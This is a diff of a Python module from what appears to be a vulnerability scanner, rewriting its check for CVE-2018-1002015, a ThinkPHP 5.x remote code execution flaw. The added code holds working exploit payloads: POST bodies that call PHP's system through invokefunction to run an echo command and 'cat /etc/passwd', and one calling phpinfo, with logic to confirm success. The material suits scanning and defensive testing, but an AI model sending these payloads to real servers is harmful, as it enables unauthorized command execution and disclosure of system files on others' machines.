@@ -1,62 +1,63 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
+from lib.tool.md5 import random_md5
 from lib.tool import check
-from thirdparty import requests
-import re
 
-def cve_2018_1002015_scan(self, url):
+cve_2018_1002015_payloads = [
+    {
+        'path': 'index.php?s=index/\\think\\Container/invokefunction',
+        'data': 'function=call_user_func_array&vars[0]=system&vars[1][]={RCECOMMAND}',
+    },
+    {
+        'path': 'index.php?s=index/\\think\\Container/invokefunction',
+        'data': 'function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
+    },
+    {
+        'path': 'index.php?s=index/\\think\\Container/invokefunction',
+        'data': 'function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
+    }
+]
+
+def cve_2018_1002015_scan(self, clients):
     ''' ThinkPHP 5.0.23及5.1.31以下版本RCE
         ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞, 
         该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤,
         远程攻击者可通过输入字符 \ 的方式调用任意方法利用该漏洞执行代码
     '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'RCE'
-    vul_info['vul_id'] = 'CVE-2018-1002015'
-    vul_info['vul_method'] = 'POST'
+    client = clients.get('reqClient')
 
-    for payload in self.cve_2018_1002015_payloads:
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'RCE',
+        'vul_id': 'CVE-2018-1002015',
+    }
+
+    for payload in cve_2018_1002015_payloads:
+        randomStr = random_md5(6)
+        RCEcommand = 'echo ' + randomStr
+        
         path = payload['path']
-        data = payload['data']
-        headers = payload['headers']
-        target = url + path
+        data = payload['data'].format(RCECOMMAND=RCEcommand)
 
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['headers'] = headers
-        vul_info['target'] = target
+        res = client.request(
+            'post',
+            path,
+            data=data,
+            vul_info=vul_info
+        )
+        if res is None:
+            continue
 
-        try:
-            res = requests.post(
-                target, 
-                timeout=self.timeout, 
-                headers=headers,
-                data=data, 
-                proxies=self.proxies, 
-                verify=False
-            )
-            logger.logging(vul_info, res.status_code, res)                        # * LOG
-
-            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
-                or (self.md in check.check_res(res.text, self.md))
-                or (('PHP Version' in res.text) 
-                    and ('PHP License' in res.text))
-            ):
-                results = {
-                    'Target': target,
-                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Request': res
-                }
-                return results
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+        if (check.check_res(res.text, randomStr)
+            or check.check_res_fileread(res.text)
+            or (('PHP Version' in res.text) 
+                and ('PHP License' in res.text))
+        ):
+            results = {
+                'Target': res.request.url,
+                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                'Request': res
+            }
+            return results
+    return None
